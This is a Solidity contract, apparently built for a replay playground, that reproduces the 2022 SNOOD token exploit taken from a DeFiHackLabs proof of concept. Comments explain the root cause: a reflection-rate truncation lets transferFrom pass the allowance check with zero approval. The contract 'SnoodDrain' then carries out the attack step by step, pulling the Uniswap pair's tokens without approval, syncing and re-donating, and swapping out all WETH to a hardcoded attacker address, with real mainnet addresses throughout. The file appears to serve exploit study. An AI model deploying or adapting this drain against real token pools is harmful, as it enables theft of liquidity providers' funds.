// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-06-Snood).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest.testExploit` (there is no standalone attack contract to deploy).
// This file is a faithful, self-contained copy of that inline attack — the body of
// `testExploit` is moved verbatim into `run()` — compiled inside the registry forge
// project so the playground can deploy it and record run(). Logic and constants are
// copied from test/Snood_exp.sol (block 14,983,660 fork).
//
// Root cause: SNOOD (SchnoodleV9) bolts a reflection layer onto OpenZeppelin's
// ERC777Upgradeable but applies the reflection conversion asymmetrically across the
// allowance check — `allowance()` and `_spendAllowance()` both divide by the reflect
// rate, so with a raw reflected allowance of 0 the OZ `require(currentAllowance >=
// amount)` degenerates to `require(0 >= 0)` and PASSES. The subsequent `_send`,
// however, moves the FULL reflected amount. The attacker can therefore call
// `transferFrom(pair, attacker, pairBalance)` with ZERO approval and drain the
// SNOOD/WETH Uniswap pair, then `sync()` / re-donate / `swap()` to extract all WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract SnoodDrain {
    // The historical attacker EOA that receives the drained WETH
    // (0x180ea08644b123D8A3f0ECcf2a3b45A582075538 from the original exploit tx).
    address constant ATTACKER = 0x180ea08644b123D8A3f0ECcf2a3b45A582075538;

    IERC20 constant SNOOD = IERC20(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair constant PAIR = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);

    function run() external {
        // Step 1 — allowance bypass: pull the pair's entire SNOOD balance (minus 1
        // wei) into THIS contract with NO approval. The reflection-truncated
        // `_spendAllowance` reads `0 >= 0` and passes; the inner `_send` then moves
        // the full reflected amount.
        uint256 balance = SNOOD.balanceOf(address(PAIR));
        require(SNOOD.transferFrom(address(PAIR), address(this), balance - 1));

        // Step 2 — re-anchor reserves to the manipulated balances. After step 1 the
        // pair holds only 1 wei of SNOOD, so `sync()` collapses reserve1 to 1 and
        // makes SNOOD "infinitely expensive".
        PAIR.sync();

        // Step 3 — donate the SNOOD back into the pair. The pair's sell-fee/burn/quota
        // machinery fires, but the donation rebuilds the SNOOD balance so the next
        // swap can "pay in" SNOOD and satisfy the constant-product check.
        require(SNOOD.transfer(address(PAIR), balance - 1));

        // Step 4 — compute the WETH-out amount against the degenerate reserves
        // (r0 = ~104 WETH, r1 = 1). The V2 0.3% fee is encoded as 9970 / 10000.
        (uint112 a, uint112 b, ) = PAIR.getReserves();

        uint256 amount0Out;
        if (b * 10_000 + (balance - 1) * 9970 == 0) {
            amount0Out = 0;
        } else {
            amount0Out = ((balance - 1) * 9970 * a) / (b * 10_000 + (balance - 1) * 9970);
        }

        // Step 5 — drain the entire WETH reserve straight to the attacker EOA.
        PAIR.swap(amount0Out, 0, ATTACKER, "");
    }
}
